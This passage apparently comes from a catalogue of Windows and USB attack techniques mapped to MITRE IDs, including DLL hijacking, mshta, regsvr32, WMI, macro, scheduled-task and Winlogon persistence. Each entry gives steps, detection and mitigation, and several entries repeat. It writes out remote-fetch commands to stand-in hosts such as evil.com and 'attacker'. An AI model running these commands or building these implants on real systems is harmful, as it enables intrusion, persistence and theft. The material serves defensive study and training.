- **Attack Steps**: 1. The USB contains an executable built using PyInstaller that appears as a legitimate file (e.g., image viewer). 2. Upon execution by the user, the script installs itself into a hidden directory and initiates a background loop that captures screen snapshots every 15–30 seconds. 3. These screenshots are temporarily stored in a hidden directory before being uploaded periodically to an attacker-controlled FTP, Google Drive, or Dropbox via API. 4. Persistence is achieved via cron (Linux) or registry keys/startup folder (Windows). 5. The tool avoids detection by not showing windows and minimizing resource usage. 6. The attack enables real-time surveillance of user sessions, data exposure, and account theft.
- **Detection**: Monitor screen capture API usage, FTP/upload logs
- **Solution**: Disable unnecessary screen APIs, restrict cloud access
- **Tags**: #ScreenLogger #MITRE_T1113 #USBSpyware #ScreenshotTheft

## USB Enables Remote Desktop Stealthily via HID Emulation

- **Attack Type**: Hidden RDP Activation
- **Target**: Engineer/Admin PCs
- **Vulnerability**: Auto-trust HID input devices
- **MITRE**: T1021.001 – Remote Services (RDP)
- **Impact**: Remote access without detection
- **Tools**: PowerShell, HID spoofing, Netsh Firewall
- **Scenario**: USB emulates keyboard, executes script to activate RDP and open firewall.
- **Attack Steps**: 1. The USB is programmed to act as a HID device (like a keyboard), sending scripted keystrokes upon insertion. 2. These keystrokes launch PowerShell and execute commands to enable Remote Desktop via registry changes and system settings. 3. It then adds firewall rules to allow inbound RDP traffic on port 3389 using netsh advfirewall commands. 4. Optionally, it creates a hidden admin user with a predefined password. 5. The attacker later connects using RDP, appearing as a legitimate session. 6. If no monitoring is in place, this may go unnoticed on non-hardened machines.
- **Detection**: RDP logs, new user monitoring, firewall rule changes
- **Solution**: Enforce RDP restrictions, block HID-based USB inputs
- **Tags**: #HIDBackdoor #RDPHijack #MITRE_T1021_001 #USBKeyboardHack

## USB Performs DLL Injection via Legit App Trick

- **Attack Type**: DLL Preload Hijack via USB Drop
- **Target**: Windows Laptops
- **Vulnerability**: DLL Search Path Vulnerability
- **MITRE**: T1574.001 – DLL Search Order Hijack
- **Impact**: Code execution, stealth backdoor
- **Tools**: PEStudio, Legit EXE, DLL Injector Tools
- **Scenario**: Uses DLL hijacking by dropping malicious library alongside trusted app.
- **Attack Steps**: 1. The attacker prepares a USB containing a trusted application executable (e.g., VLC or 7zip) and a malicious DLL with the same name as one the app usually loads dynamically. 2. When the user runs the EXE from the USB, the Windows loader prioritizes the local directory and loads the attacker’s DLL instead of the legitimate system DLL. 3. The malicious DLL contains code for establishing a reverse shell, installing a keylogger, or creating persistence. 4. The victim sees the original application UI functioning normally, masking the compromise. 5. This method relies on user curiosity and weak execution restrictions. 6. Effective for social engineering USB drops or insider attacks.
- **Detection**: Monitor DLL loading paths, hash check binaries
- **Solution**: Enable Safe DLL Search Mode, restrict USB execution
- **Tags**: #DLLInjection #USBTrap #MITRE_T1574_001 #AppHijack

## Compromised Tech Forum for Malware Drop

- **Attack Type**: Watering Hole
- **Target**: Software Developers, R&D Staff
- **Vulnerability**: Trusted niche sites, plugin vulnerabilities
- **MITRE**: T1189 – Drive-By Compromise
- **Impact**: Covert access to internal developer systems
- **Tools**: WordPress Exploit, JS Obfuscator, Payload Host
- **Scenario**: Attackers breach a niche developer forum to inject malware into site scripts that trigger on visits.
- **Attack Steps**: 1. Attacker identifies a credible developer forum frequently visited by engineers in the target company. 2. They exploit outdated WordPress plugins or stolen admin credentials to gain backend access. 3. Injects obfuscated JavaScript into the main post template or banner ads. 4. The script checks browser fingerprinting to selectively deliver malware only to users with specific IP ranges or browser types. 5. When the victim developer visits, their outdated browser plugin (e.g., PDF viewer) is exploited, downloading a stealthy backdoor without their awareness.
- **Detection**: Browser behavior analytics, plugin monitoring
- **Solution**: Enforce browser patching, use JS threat intel feeds
- **Tags**: #DevForumExploit #WateringHole #TargetedMalware #MITRE_T1189

## Obfuscated PowerShell Reverse Shell Drop

- **Attack Type**: Reverse Shell via Script
- **Target**: Enterprise Desktops, Admin Workstations
- **Vulnerability**: PowerShell unrestricted use, hidden scripting
- **MITRE**: T1059.001 – PowerShell
- **Impact**: Long-term system access via stealth shell
- **Tools**: PowerShell, C2 Framework, Windows Scheduler
- **Scenario**: Executes a hidden PowerShell payload encoded in Base64 for system compromise.
- **Attack Steps**: 1. Attacker crafts a PowerShell reverse shell payload and encodes it in Base64 to bypass filters. 2. Uses a dropper (via email, USB, or initial foothold) to deliver and schedule execution (e.g., using schtasks or registry run keys). 3. Once triggered, PowerShell runs with -nop -w hidden to avoid detection, then connects to the attacker's C2 server. 4. Attacker gains a fully interactive shell, often using staging tools like Empire or Cobalt Strike. 5. Persistence mechanisms are embedded, such as task re-registration or script hiding in WMI subscriptions.
- **Detection**: AMSI logs, command-line telemetry
- **Solution**: Disable PowerShell where unused, enforce constrained language mode
- **Tags**: #EncodedShell #PowerShellC2 #StealthAccess #MITRE_T1059_001

## WMI Lateral Execution to Deploy Malware

- **Attack Type**: Remote Command Execution
- **Target**: Internal Workstations
- **Vulnerability**: Poor WMI monitoring, over-permissive admin access
- **MITRE**: T1047 – WMI
- **Impact**: Remote execution with low forensic visibility
- **Tools**: WMIC, Cobalt Strike, Nishang Scripts
- **Scenario**: Uses WMI to execute payloads across systems without triggering normal remote access alarms.
- **Attack Steps**: 1. Attacker first gains credentials with admin privileges on target domain. 2. Enumerates machines and uses wmic /node:<host> process call create to remotely execute a command that downloads and runs a malware payload. 3. Since WMI runs without interactive login, this evades endpoint detection that looks for desktop sessions or RDP usage. 4. Malware establishes C2, potentially deploying ransomware or data exfiltration modules. 5. Uses WMI Event Consumers to maintain persistence with minimal footprint.
- **Detection**: WMI audit logs, lateral movement traces
- **Solution**: Limit remote WMI calls, apply EDR-based WMI rules
- **Tags**: #WMIExecution #RemotePayload #MITRE_T1047 #LowFootprintAttack

## HTML App (HTA) Execution via MSHTA

- **Attack Type**: Trusted Binary Misuse
- **Target**: Office Endpoints
- **Vulnerability**: mshta.exe trusted by default
- **MITRE**: T1218.005 – Signed Binary Proxy Execution
- **Impact**: Executes malware without triggering binary alerts
- **Tools**: mshta.exe, Hosted HTA, Pastebin
- **Scenario**: Delivers HTA file using mshta.exe to run malicious scripts under signed binary.
- **Attack Steps**: 1. Host an HTA script (HTML Application) that includes VBScript or JavaScript payload capable of downloading a second-stage binary. 2. Send a phishing email with a link like mshta http://malicious.site/payload.hta, disguised as a job ad or invoice viewer. 3. Upon execution, mshta (a Microsoft-signed binary) runs the script, evading some AV tools. 4. The script silently drops malware into a temp directory and runs it with elevated privileges if possible. 5. Because mshta is trusted and rarely monitored, attackers can bypass AppLocker or Defender.
- **Detection**: Process chain analysis, script monitoring
- **Solution**: Block mshta via GPO, allow only signed scripts
- **Tags**: #MSHTAAbuse #HTAExfiltration #SignedBypass #MITRE_T1218_005

## Scheduled Task to Maintain Persistence

- **Attack Type**: Scheduled Task for Execution
- **Target**: Domain Workstations
- **Vulnerability**: Weak task visibility, no naming convention audit
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Long-term persistence & automated malware delivery
- **Tools**: schtasks.exe, Cobalt Strike, Dropper Script
- **Scenario**: Creates Windows Scheduled Tasks that auto-run malware repeatedly with elevated privileges.
- **Attack Steps**: 1. Upon gaining access, the attacker uses schtasks.exe to schedule a job that runs a malicious script every few minutes (e.g., /sc minute /mo 5). 2. The script could relaunch a dropped RAT, exfiltrate logs, or pull new payloads from the C2 server. 3. Because scheduled tasks often blend into system operations, this avoids user suspicion. 4. Attacker names the task innocuously (e.g., “DriverSync” or “UpdateTask”) to avoid detection. 5. Task can be set to survive reboots and ensure re-entry even if initial malware is removed.
- **Detection**: Monitor task creation logs, compare with baseline
- **Solution**: Task whitelisting, enforce admin-only task creation
- **Tags**: #ScheduledExec #HiddenPersistence #MITRE_T1053_005

## Watering Hole Attack on Technical Documentation Portal

- **Attack Type**: Compromised Niche Site Delivery
- **Target**: Developers, Engineers
- **Vulnerability**: Trust in niche developer tools and outdated plugin dependencies
- **MITRE**: T1189 – Drive-By Compromise
- **Impact**: Silent exploitation of high-value technical users
- **Tools**: JavaScript Injector, Obfuscated HTA Loader
- **Scenario**: Attacker compromises a frequently visited documentation site to infect specific user groups.
- **Attack Steps**: 1. Identify a technical site frequently accessed by developers (e.g., vendor SDK documentation or software library portal). 2. Exploit a CMS vulnerability (such as WordPress plugin flaw or admin panel access) to gain unauthorized write permissions. 3. Inject an obfuscated JavaScript snippet into the homepage footer to silently load a remote HTA payload. 4. When developers visit the site, the JS silently loads the HTA script using a signed binary like mshta.exe, executing it in the background. 5. The HTA downloads a second-stage malware such as a reverse shell or credential stealer. 6. Browser plugin vulnerabilities (like Flash or PDF readers) are further exploited for deeper access. 7. The malware beacons to a C2 while evading detection due to the trusted source domain.
- **Detection**: Beaconing detection, JS injection heuristics
- **Solution**: Web application hardening, browser security enforcement
- **Tags**: #WateringHole #DevInfection #HTAInjection #MITRE_T1189

## PowerShell Reverse Shell via Obfuscated Delivery

- **Attack Type**: Scripted Payload via PowerShell
- **Target**: Windows Hosts
- **Vulnerability**: PowerShell unrestricted & misconfigured execution policies
- **MITRE**: T1059.001 – PowerShell
- **Impact**: Remote shell with post-exploitation capability
- **Tools**: PowerShell, Empire, Netcat
- **Scenario**: Executes an obfuscated PowerShell-based reverse shell post-initial compromise.
- **Attack Steps**: 1. Encode a full PowerShell reverse shell command using Base64, for example: powershell -nop -w hidden -enc <encoded_payload>. 2. Distribute the payload through one of several vectors: a phishing email with a malicious attachment, a malicious USB drive dropped near the target, or embedded within a macro-enabled Office file. 3. Upon execution, the payload initiates a reverse connection to the attacker-controlled system via Netcat or Cobalt Strike’s beaconing service. 4. The attacker gains shell access, operating under the context of the executing user, and can escalate privileges or laterally move. 5. Due to PowerShell’s trusted status, legacy AV often misses the obfuscated activity unless AMSI or script block logging is enforced.
- **Detection**: AMSI logs, script block logging, reverse connection monitoring
- **Solution**: Harden PowerShell policies, enable Constrained Language Mode
- **Tags**: #ReverseShell #PowerShellAbuse #MITRE_T1059_001

## Stealthy Remote Execution via WMI

- **Attack Type**: WMI Remote Execution
- **Target**: Enterprise Windows Systems
- **Vulnerability**: Lack of WMI auditing and no lateral movement detection
- **MITRE**: T1047 – WMI
- **Impact**: Fileless remote code execution
- **Tools**: WMIC, PowerShell Empire, Nishang Scripts
- **Scenario**: Executes malware on a remote machine via Windows Management Instrumentation (WMI).
- **Attack Steps**: 1. From a compromised host, attacker uses WMIC or PowerShell WMI interface to execute code on a remote machine using commands like wmic /node:<IP> process call create "cmd.exe /c payload.exe". 2. The payload (reverse shell or malware) is fetched from a remote server or dropped locally before execution. 3. Execution occurs silently without any GUI, under the SYSTEM context if privileges allow. 4. Minimal logs are generated unless WMI auditing is enabled, making this ideal for stealth lateral movement. 5. Often chained with credential theft or token impersonation to maintain persistence post-execution.
- **Detection**: WMI operational logs, event ID 5857/5858
- **Solution**: Enable full WMI logging, restrict admin permissions
- **Tags**: #WMIExecution #FilelessAttack #MITRE_T1047

## HTA File Execution via Trusted Binary (mshta.exe)

- **Attack Type**: HTML Application Abuse
- **Target**: Windows Users
- **Vulnerability**: Overtrust in signed binaries like mshta.exe
- **MITRE**: T1218.005 – Signed Binary Proxy Execution
- **Impact**: Stealthy payload via Microsoft-signed binary
- **Tools**: mshta.exe, Pastebin, HTA Generator
- **Scenario**: Leverages mshta.exe to run a malicious remote script, often undetected due to trusted signature.
- **Attack Steps**: 1. Host a malicious .hta script containing VBScript or JScript logic (e.g., to download a second-stage EXE) on Pastebin or a rogue HTTP server. 2. Deliver a phishing link like mshta http://evil.com/mal.hta embedded in an HTML email or Office macro. 3. Victim's system runs mshta.exe, a signed binary, which executes the HTA file without user prompts. 4. HTA executes under the context of the user, often fetching malware or establishing a reverse shell silently. 5. Most AVs and EDR tools ignore mshta.exe unless behavior-based detection is enabled.
- **Detection**: Monitor mshta executions and child processes
- **Solution**: Disable mshta.exe if unused, enforce signed-script execution
- **Tags**: #HTAAbuse #mshta #ProxyExecution #MITRE_T1218_005

## Scheduled Task Persistence for Covert Execution

- **Attack Type**: Scheduled Script Execution
- **Target**: Domain-Joined Endpoints
- **Vulnerability**: Weak auditing of user-created or system tasks
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Persistent access and re-execution of payloads
- **Tools**: schtasks.exe, Cobalt Strike, Cron-like Windows Jobs
- **Scenario**: Attacker maintains persistence by using scheduled tasks to execute payload repeatedly.
- **Attack Steps**: 1. After gaining access, attacker creates a task using schtasks /create /tn "Updater" /tr "powershell.exe -File C:\payload.ps1" /sc minute /mo 15. 2. The task is set to run invisibly with SYSTEM privileges, bypassing UAC. 3. Each interval, the task triggers a connection to the attacker’s C2 or executes post-exploitation logic (e.g., enumeration or credential dump). 4. Task name is often obfuscated as a legitimate process like “Windows Update” or “Chrome Helper” to avoid attention. 5. If defenders do not audit scheduled tasks, it may persist for days or weeks undetected.
- **Detection**: Detect newly created tasks, log frequency anomalies
- **Solution**: Enforce task creation policy, limit scheduler privileges
- **Tags**: #Persistence #ScheduledTasks #MITRE_T1053_005

## Malicious JS via USB Drop and User Interaction

- **Attack Type**: Script Execution (via .js File)
- **Target**: End Users
- **Vulnerability**: Users enabled WSH and allowed local script execution
- **MITRE**: T1059.007 – JavaScript
- **Impact**: User-triggered code execution with stealthy control
- **Tools**: Windows Script Host, Obfuscated JS, WScript.Shell
- **Scenario**: A .js file disguised as a document is used to trick the user into executing a malicious script.
- **Attack Steps**: 1. Attacker creates a .js file that uses WScript.Shell to execute system commands like PowerShell reverse shell. 2. JavaScript code is heavily obfuscated using Base64 or hex strings to prevent static detection. 3. File is disguised with a misleading name and icon (e.g., “Resume 2025.pdf.js”) and dropped via phishing or USB. 4. On double-click, Windows Script Host executes the script silently in the background. 5. The payload initiates C2 communications or downloads additional malware from remote URLs.
- **Detection**: Monitor .js executions, alert on suspicious child processes
- **Solution**: Block .js extensions in emails, disable WSH where unnecessary
- **Tags**: #JSExecution #ObfuscatedPayload #MITRE_T1059_007

## DLL Sideloading via Third-Party Updater App

- **Attack Type**: DLL Hijacking via Load Order Abuse
- **Target**: Windows Hosts
- **Vulnerability**: No DLL load order hardening, unsigned DLLs allowed
- **MITRE**: T1574.001 – DLL Search Order Hijacking
- **Impact**: Hidden execution via trusted program
- **Tools**: Malicious DLL, VLC Media Player, ProcMon
- **Scenario**: Executes a malicious DLL by exploiting search order flaws in trusted applications.
- **Attack Steps**: 1. Locate a vulnerable executable (e.g., updater.exe) that searches for DLLs in the same directory before checking system paths. 2. Create a malicious DLL named identically to a missing dependency (e.g., “libvlc.dll”). 3. Bundle this DLL with the trusted executable and deliver to the target via phishing, shared drives, or software packaging. 4. When the user launches the executable, it loads the attacker’s DLL first due to default load order. 5. The DLL runs under the context of the trusted app, bypassing some behavioral EDR alerts.
- **Detection**: DLL load behavior tracking, app context inspection
- **Solution**: Enforce proper DLL validation, limit execution directory scope
- **Tags**: #DLLHijack #TrustedAppAbuse #MITRE_T1574_001

## Legacy HTA Execution via Autorun USB

- **Attack Type**: HTA + AutoRun Exploit
- **Target**: Legacy Windows Systems
- **Vulnerability**: Autorun enabled, no HTA restriction
- **MITRE**: T1059 – Command and Scripting Interpreter
- **Impact**: Malware triggered automatically on insert
- **Tools**: HTA Builder, Autorun.inf, USB Toolkits
- **Scenario**: Uses HTA payload on USB with autorun to infect legacy Windows machines.
- **Attack Steps**: 1. Create a .hta file embedding a VBScript-based payload (e.g., for PowerShell execution or beacon dropper). 2. Prepare an autorun.inf file that references the .hta as the default execution target. 3. Format a USB drive and copy both files. 4. On insertion into an unpatched legacy system (e.g., Windows 7), autorun automatically executes the HTA file. 5. The HTA file runs malware silently, establishes persistence, or adds registry keys for future boot-time payloads.
- **Detection**: USB autorun logs, HTA execution audit
- **Solution**: Disable autorun, block HTA files via GPO
- **Tags**: #USBHTA #AutorunAttack #LegacyExploit #MITRE_T1059

## Office Macro Payload in Phishing Attachment

- **Attack Type**: VBA Macro Execution in Office File
- **Target**: Office Users
- **Vulnerability**: Users enabling macros in unknown documents
- **MITRE**: T1059.005 – Visual Basic
- **Impact**: Code execution via native Office tools
- **Tools**: VBA, Empire, Phishing Kit
- **Scenario**: Executes malicious code via macro-enabled Office document post-phishing.
- **Attack Steps**: 1. Use MS Word or Excel to create .docm or .xlsm file containing an auto-executing VBA macro. 2. Macro is coded to invoke powershell.exe to download and run a second-stage payload. 3. File is disguised as an invoice, resume, or report and delivered via a socially-engineered phishing email. 4. When the user opens the document and enables macros, the embedded VBA runs automatically. 5. The malware executes stealthily in user mode, contacting a C2 server or exfiltrating credentials.
- **Detection**: Monitor macro executions, flag unknown macro sources
- **Solution**: Disable macros by default, use signed macro policies
- **Tags**: #MacroAttack #VBAPayload #OfficeExploit #MITRE_T1059_005

## Remote COM Script Execution via Regsvr32

- **Attack Type**: COM Hijack with Regsvr32
- **Target**: Enterprise Windows Systems
- **Vulnerability**: Trust in signed binaries, lack of proxy inspection
- **MITRE**: T1218.010 – Regsvr32 Proxy Execution
- **Impact**: Executes remote script with zero file footprint
- **Tools**: Regsvr32.exe, HTTP Server, SCT Loader
- **Scenario**: Executes remote payload by abusing regsvr32 with a remotely hosted .sct script.
- **Attack Steps**: 1. Create a malicious .sct file that calls Windows shell objects to execute PowerShell commands. 2. Host the .sct on a remote server or pastebin. 3. From target system, run regsvr32 /s /n /u /i:http://malicious.site/payload.sct scrobj.dll to trigger the exploit. 4. Because regsvr32.exe is signed by Microsoft, the execution bypasses many application whitelisting or AV solutions. 5. No local file drops are required, enhancing stealth.
- **Detection**: Detect regsvr32 network use, monitor for SCT access
- **Solution**: Block regsvr32 via application control, inspect SCT traffic
- **Tags**: #Regsvr32 #ProxyExecution #StealthExploit #MITRE_T1218_010

## Malicious JavaScript via Obfuscated File Execution

- **Attack Type**: Script Execution (User Interaction)
- **Target**: End Users
- **Vulnerability**: Script execution via WSH enabled
- **MITRE**: T1059.007 – JavaScript
- **Impact**: Remote shell via trusted interpreter
- **Tools**: Obfuscated JS, Windows Script Host, JSEncoders
- **Scenario**: Delivers an obfuscated JavaScript file that executes a payload when triggered by user interaction, bypassing naive antivirus.
- **Attack Steps**: 1. Craft a JavaScript file with embedded malicious code capable of reverse shell or file download, using WScript.Shell. 2. Use tools like JSFuck or Dean Edwards packer to obfuscate the script to evade AV and EDR. 3. Deliver the file through a phishing attachment, such as “invoice.js” disguised with a PDF icon. 4. Trick user into executing it by social engineering or deceptive naming. 5. Once double-clicked, Windows Script Host interprets and runs it. 6. The code initiates outbound connection to attacker C2, enabling remote command execution.
- **Detection**: Monitor WSH invocations, .js file execution
- **Solution**: Block WSH, scan email attachments for .js
- **Tags**: #JavaScriptAbuse #WSHAttack #MITRE_T1059_007

## DLL Side-Loading via Fake Updater

- **Attack Type**: DLL Hijacking via Load Order Abuse
- **Target**: Corporate Workstations
- **Vulnerability**: Trust in updaters, DLL load precedence
- **MITRE**: T1574.001 – DLL Search Order Hijacking
- **Impact**: Stealthy execution via hijacked app
- **Tools**: Fake Updater, Malicious DLL, Dependency Viewer
- **Scenario**: Malicious DLL is side-loaded through a fake software updater leveraging legitimate application behavior.
- **Attack Steps**: 1. Build a trojanized software updater with a signed but benign EXE. 2. Place malicious DLL matching a known dependency (e.g., “update.dll”) in same folder. 3. Execute updater, which loads the local malicious DLL due to Windows DLL search order. 4. DLL contains payload that spawns reverse shell or modifies registry for persistence. 5. Attack blends into legitimate software update flow.
- **Detection**: Monitor unusual DLLs next to EXEs
- **Solution**: Enforce signed DLL loading only
- **Tags**: #SideLoadAttack #UpdatersAbused #MITRE_T1574_001

## HTA Autorun via Obsolete System Exploitation

- **Attack Type**: Autorun Execution
- **Target**: Legacy Systems
- **Vulnerability**: Autorun + HTA not disabled
- **MITRE**: T1059 – Command & Scripting Interpreter
- **Impact**: Remote access via USB injection
- **Tools**: HTA Builder, Autorun.inf, USB Writer
- **Scenario**: Malicious HTA executes automatically via USB on unpatched or legacy systems with Autorun enabled.
- **Attack Steps**: 1. Design an HTA file with embedded VBScript that launches PowerShell payload. 2. Create an autorun.inf that silently links to the HTA on USB insertion. 3. Write to USB using custom tools to avoid detection. 4. On insertion into older Windows versions (e.g., Windows XP/7), the HTA runs due to enabled autorun feature. 5. Attacker gains shell access or installs keylogger silently.
- **Detection**: Monitor autorun triggers and HTA file use
- **Solution**: Disable autorun globally, restrict HTA
- **Tags**: #USBPayload #HTAAbuse #LegacyHacks #MITRE_T1059

## Office Macro Attack with Obfuscated VBA and C2

- **Attack Type**: Office Macro Abuse
- **Target**: Office Users
- **Vulnerability**: Macros enabled, low macro security
- **MITRE**: T1059.005 – Visual Basic
- **Impact**: Initial access & remote control
- **Tools**: Obfuscated VBA, Empire, Word
- **Scenario**: Malicious macro in a Word document executes an obfuscated PowerShell script connecting to attacker.
- **Attack Steps**: 1. Write VBA macro that decodes a base64-encoded PowerShell reverse shell. 2. Insert into Word .docm file using developer tools or programmatically. 3. Send via convincing email with lures like “Urgent_Report.docm”. 4. Upon opening and enabling macros, the macro silently executes the shellcode. 5. PowerShell spawns and establishes remote C2 connection.
- **Detection**: Detect abnormal macro execution & process tree
- **Solution**: Disable unsigned macros in GPO
- **Tags**: #VBAMacro #OfficeAttack #MITRE_T1059_005

## Regsvr32 Remote COM Scriptlet Loader

- **Attack Type**: Living-off-the-Land Binary Execution
- **Target**: Windows Hosts
- **Vulnerability**: Trust in regsvr32, no remote .sct restriction
- **MITRE**: T1218.010 – Regsvr32 Proxy Execution
- **Impact**: Stealthy in-memory execution
- **Tools**: Regsvr32, Remote .sct, Web Server
- **Scenario**: Uses regsvr32.exe to execute remote COM scriptlet file hosted on attacker’s server, avoiding local file detection.
- **Attack Steps**: 1. Host a malicious .sct (scriptlet) file with VBScript or JScript payload on HTTP server. 2. Use command regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll on target. 3. Regsvr32, being a signed Windows binary, downloads and executes the scriptlet. 4. No payload touches disk, keeping operation stealthy. 5. Establishes reverse shell or executes commands from memory.
- **Detection**: Monitor regsvr32 and outbound to uncommon IPs
- **Solution**: Block or restrict regsvr32 via AppLocker
- **Tags**: #LoLBins #Regsvr32Hack #Scriptlet #MITRE_T1218_010

## MSBuild Payload via XML Dropper

- **Attack Type**: Signed Binary + Inline Task Abuse
- **Target**: Developer Machines
- **Vulnerability**: Trust in MSBuild, no inline task scanning
- **MITRE**: T1127.001 – MSBuild Execution
- **Impact**: Memory-only payload execution
- **Tools**: MSBuild.exe, XML Schema, SharpShell
- **Scenario**: Executes C# payload embedded in XML file using MSBuild.exe, leveraging trusted binary status.
- **Attack Steps**: 1. Create an XML file that defines inline C# task per MSBuild schema. 2. Embed shellcode (e.g., reverse TCP) within the C# task. 3. Deliver file as part of software bundle or via phishing link. 4. Victim executes using MSBuild.exe payload.xml. 5. Payload runs in memory, avoiding AV detection.
- **Detection**: Monitor MSBuild and child process creation
- **Solution**: Disable MSBuild or restrict XML tasks
- **Tags**: #MSBuildExec #InlineTaskExploit #MITRE_T1127_001

## Persistent Winlogon DLL Backdoor

- **Attack Type**: Persistence via Registry Hijack
- **Target**: Enterprise Endpoints
- **Vulnerability**: Registry not monitored, DLLs not signed
- **MITRE**: T1547.001 – Winlogon Helper DLL
- **Impact**: Stealth persistence with SYSTEM rights
- **Tools**: Malicious DLL, Registry Tweaks
- **Scenario**: Registers a malicious DLL to be executed by Winlogon during user logon, achieving stealth persistence.
- **Attack Steps**: 1. Develop DLL with execution logic (e.g., connect-back shell). 2. Copy to trusted directory like C:\Windows\System32. 3. Create or modify registry key: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Backdoor. 4. Populate required subkeys (DLLName, Asynchronous, etc.). 5. On every user login, the DLL runs silently.
- **Detection**: Monitor Winlogon registry keys and DLL calls
- **Solution**: Audit registry + prevent unsigned DLL use
- **Tags**: #RegistryPersistence #WinlogonDLL #MITRE_T1547_001

## Task Scheduler DLL Injection for Escalation

- **Attack Type**: Service DLL Path Hijacking
- **Target**: Admin Workstations
- **Vulnerability**: Writable DLL paths in services
- **MITRE**: T1574.002 – DLL Side-Loading
- **Impact**: Privilege escalation & persistence
- **Tools**: Sysinternals, DLL Injector, Explorer++
- **Scenario**: Attacker replaces DLL used by scheduled Windows task to achieve elevated execution.
- **Attack Steps**: 1. Find scheduled task with user-writable DLL path via tools like AccessChk. 2. Compile payload DLL that executes malicious logic. 3. Replace DLL at the path used by task service. 4. Wait for task execution (on schedule or trigger manually). 5. Task loads DLL and runs attacker’s code under elevated privileges.
- **Detection**: Monitor task configuration changes
- **Solution**: Harden permissions on DLL paths
- **Tags**: #ServiceHijack #DLLReplacement #MITRE_T1574_002

## Explorer Shell Extension Backdoor

- **Attack Type**: DLL Auto-Load via Explorer Plugin
- **Target**: Desktop Users
- **Vulnerability**: Shell extension registry not audited
- **MITRE**: T1546.009 – Explorer Hook
- **Impact**: Persistent execution inside Explorer
- **Tools**: Malicious DLL, Registry Editor
- **Scenario**: Malicious shell extension DLL is auto-loaded by Explorer, granting execution on every session.
- **Attack Steps**: 1. Write a DLL implementing required Explorer COM interfaces. 2. Add registry entry under: HKCU\...\Shell Extensions\Approved. 3. DLL is automatically loaded by Explorer on startup. 4. Executes payload such as file monitoring, keylogging, or persistence hook. 5. Difficult to detect due to integration with native UI behavior.
- **Detection**: Monitor shell extension loading
- **Solution**: Restrict non-signed shell extensions
- **Tags**: #ExplorerAbuse #ShellBackdoor #MITRE_T1546_009

## Script Execution via MSI Installer Dropper

- **Attack Type**: Signed Installer Abuse
- **Target**: Enterprise Systems
- **Vulnerability**: MSI not blocked by policy, script in MSI not scanned
- **MITRE**: T1218.007 – MSIExec Execution
- **Impact**: Remote code execution under install context
- **Tools**: MSI Packager, PowerShell, MSIExec
- **Scenario**: MSI package contains embedded script that runs silently, trusted by default policies.
- **Attack Steps**: 1. Package PowerShell script or EXE payload inside an .msi installer using tools like Advanced Installer. 2. Deliver MSI via email or link labeled as "security update" or "software installer." 3. User executes MSI, thinking it's legitimate software. 4. During installation phase, embedded script runs, fetching or executing additional payloads. 5. Uses trust in MSI format to evade execution policy.
- **Detection**: Monitor MSI execution logs, suspicious MSI usage
- **Solution**: Block unsigned MSIs, restrict MSIExec
- **Tags**: #SignedMSI #DropperPayload #MITRE_T1218_007

